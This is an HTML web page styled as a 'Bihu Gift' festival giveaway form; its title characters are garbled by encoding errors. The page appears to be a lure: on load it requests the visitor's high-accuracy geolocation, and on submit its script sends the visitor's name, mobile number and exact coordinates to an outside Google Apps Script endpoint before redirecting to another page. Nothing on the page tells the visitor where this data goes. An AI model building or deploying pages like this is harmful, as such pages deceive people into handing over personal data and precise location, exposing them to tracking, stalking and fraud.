<!DOCTYPE html>
<html>
<head>
  <title>‡¶¨‡¶ø‡¶π‡ßÅ‡ß∞ ‡¶â‡¶™‡¶π‡¶æ‡ß∞ (Bihu Gift)</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">

  <style>
    body {
      font-family: Arial;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      margin: 0;
      background: linear-gradient(135deg, blue, purple);
    }
    form {
      background: aqua;
      padding: 30px;
      border-radius: 12px;
      max-width: 400px;
      width: 100%;
      text-align: center;
      box-shadow: 0 0 15px rgba(0,0,0,0.3);
    }
    input, button {
      width: 100%;
      padding: 10px;
      margin: 8px 0;
      border-radius: 6px;
      border: none;
    }
    button {
      background: green;
      color: white;
      font-size: 16px;
      cursor: pointer;
    }
    #status {
      font-weight: bold;
      margin-top: 10px;
    }
  </style>
</head>

<body>

<form id="studentForm">
  <h2> Bihu Gift üéÅ </h2>

  <input type="text" name="name" placeholder="Name" required>
  <input type="text" name="reason" placeholder="Gift type" required>
  <input type="text" name="mobile" placeholder="Mobile Number" required>

  <button type="submit">Received Gift üéÅ</button>
  <p id="status">Getting location‚Ä¶</p>
</form>

<script>
const form = document.getElementById("studentForm");
const statusText = document.getElementById("status");

let lockedPosition = null;

// Get location (optional)
navigator.geolocation.getCurrentPosition(
  pos => {
    lockedPosition = pos;
    statusText.innerText = "Location captured ‚úî";
  },
  () => {
    statusText.innerText = "ZX+++";
    lockedPosition = null;
  },
  { enableHighAccuracy: true, timeout: 10000 }
);

// Submit
form.addEventListener("submit", function(e) {
  e.preventDefault();

  const data = {
    name: form.name.value,
    reason: form.reason.value,
    mobile: form.mobile.value,
    latitude: lockedPosition ? lockedPosition.coords.latitude : "",
    longitude: lockedPosition ? lockedPosition.coords.longitude : "",
    accuracy: lockedPosition ? lockedPosition.coords.accuracy : ""
  };

  fetch("https://script.google.com/macros/s/AKfycbz3rQv9nyn-B_NNyy2Vyj6WN2hZcsFgpncziEsCGhn4sB-Cwm-gP52RnvphqzH1QxCL/exec", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(data)
  });

  // üëâ NEW PAGE OPEN
  window.location.href = "bihu.html";

});
</script>

</body>
</html>
